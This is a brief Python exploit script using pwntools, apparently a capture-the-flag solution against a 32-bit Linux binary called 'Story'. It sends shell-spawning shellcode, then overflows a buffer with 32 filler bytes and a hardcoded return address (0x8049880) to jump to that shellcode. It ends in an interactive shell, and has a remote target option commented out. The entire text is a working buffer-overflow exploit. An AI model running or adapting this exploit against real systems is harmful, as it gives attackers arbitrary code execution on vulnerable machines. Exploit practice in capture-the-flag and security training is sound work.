#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.28"
#port = 8888
context(os = "linux", arch = "i386")
r = process('./Story')
#r = remote(host,port)
name = 0x8049880
r.recvuntil("Give me a good Story:\n")

r.sendline(asm(shellcraft.i386.linux.sh()))

gdb.attach(r)
r.recvuntil("It can't touch me,try again please:\n")
payload = "a"*32
payload += p32(name)
r.sendline(payload)

r.interactive()